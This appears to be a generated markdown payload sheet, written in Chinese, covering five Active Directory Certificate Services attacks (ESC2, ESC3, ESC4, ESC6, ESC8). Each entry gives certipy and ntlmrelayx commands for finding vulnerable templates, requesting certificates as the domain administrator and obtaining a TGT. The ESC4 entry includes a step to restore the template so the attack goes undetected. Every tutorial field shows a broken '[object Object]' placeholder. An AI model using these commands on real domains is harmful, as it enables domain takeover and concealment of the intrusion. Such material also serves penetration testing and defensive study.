# ADCS攻击 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（5 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. ADCS ESC2攻击

- **id:** `adcs-esc2`
- **分类:** ADCS攻击 / ESC2
- **tags:** `adcs` `esc2` `certificate`

利用ESC2模板配置错误

**前置条件**

- 域环境
- ADCS服务
- 存在ESC2模板

**利用步骤**

#### 探测ESC2模板

```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```

探测ESC2模板

> platform: `linux`

#### 请求证书

```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

请求管理员证书

| 片段 | 说明 | 类型 |
|---|---|---|
| `-template` | 指定易受攻击模板 | parameter |
| `-upn` | 指定目标用户UPN | parameter |

> platform: `linux`

#### 使用证书认证

```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```

使用证书认证

> platform: `linux`

**教程**

[object Object]

---

### 2. ADCS ESC3攻击

- **id:** `adcs-esc3`
- **分类:** ADCS攻击 / ESC3
- **tags:** `adcs` `esc3` `certificate`

利用ESC3注册代理配置错误

**前置条件**

- 域环境
- ADCS服务
- 存在ESC3配置

**利用步骤**

#### 探测ESC3

```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```

探测ESC3配置

> platform: `linux`

#### 获取注册代理证书

```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```

获取注册代理证书

> platform: `linux`

#### 代表其他用户请求证书

```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```

代表管理员请求证书

| 片段 | 说明 | 类型 |
|---|---|---|
| `-on-behalf-of` | 代表其他用户请求 | parameter |
| `-pfx agent.pfx` | 使用代理证书 | parameter |

> platform: `linux`

**教程**

[object Object]

---

### 3. ADCS ESC4攻击

- **id:** `adcs-esc4`
- **分类:** ADCS攻击 / ESC4
- **tags:** `adcs` `esc4` `certificate`

利用ESC4模板权限配置错误

**前置条件**

- 域环境
- ADCS服务
- 对模板有写权限

**利用步骤**

#### 探测ESC4

```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```

探测模板权限

> platform: `linux`

#### 修改模板配置

```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```

修改模板配置

> platform: `linux`

#### 请求证书

```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

请求管理员证书

| 片段 | 说明 | 类型 |
|---|---|---|
| `-save-old` | 保存原配置以便恢复 | parameter |
| `修改模板` | 启用SAN扩展 | keyword |

> platform: `linux`

#### 恢复模板配置

```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```

恢复模板配置

> platform: `linux`

**教程**

[object Object]

---

### 4. ADCS ESC6攻击

- **id:** `adcs-esc6`
- **分类:** ADCS攻击 / ESC6
- **tags:** `adcs` `esc6` `certificate`

利用ESC6编辑标志配置错误

**前置条件**

- 域环境
- ADCS服务
- CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**利用步骤**

#### 探测ESC6

```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```

探测CA配置

> platform: `linux`

#### 请求证书

```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```

请求管理员证书

| 片段 | 说明 | 类型 |
|---|---|---|
| `-alt` | 指定Subject Alternative Name | parameter |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA允许在请求中指定SAN | keyword |

> platform: `linux`

#### 使用证书认证

```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

认证获取TGT

> platform: `linux`

**教程**

[object Object]

---

### 5. ADCS ESC8攻击

- **id:** `adcs-esc8`
- **分类:** ADCS攻击 / ESC8
- **tags:** `adcs` `esc8` `ntlm-relay`

利用ESC8 HTTP端点进行NTLM中继

**前置条件**

- 域环境
- ADCS HTTP端点
- 可触发NTLM认证

**利用步骤**

#### 探测ESC8

```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```

探测HTTP端点

> platform: `linux`

#### 设置NTLM中继

```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
监听NTLM认证并中继到ADCS
```

设置NTLM中继

| 片段 | 说明 | 类型 |
|---|---|---|
| `-t http://CA_SERVER` | 目标ADCS HTTP端点 | parameter |
| `--adcs` | 启用ADCS模板 | parameter |

> platform: `linux`

#### 触发认证

```
使用多种方式触发:
- 发送邮件链接
- 打印机漏洞
- WebDAV
- 其他NTLM触发方式
```

触发目标NTLM认证

**教程**

[object Object]
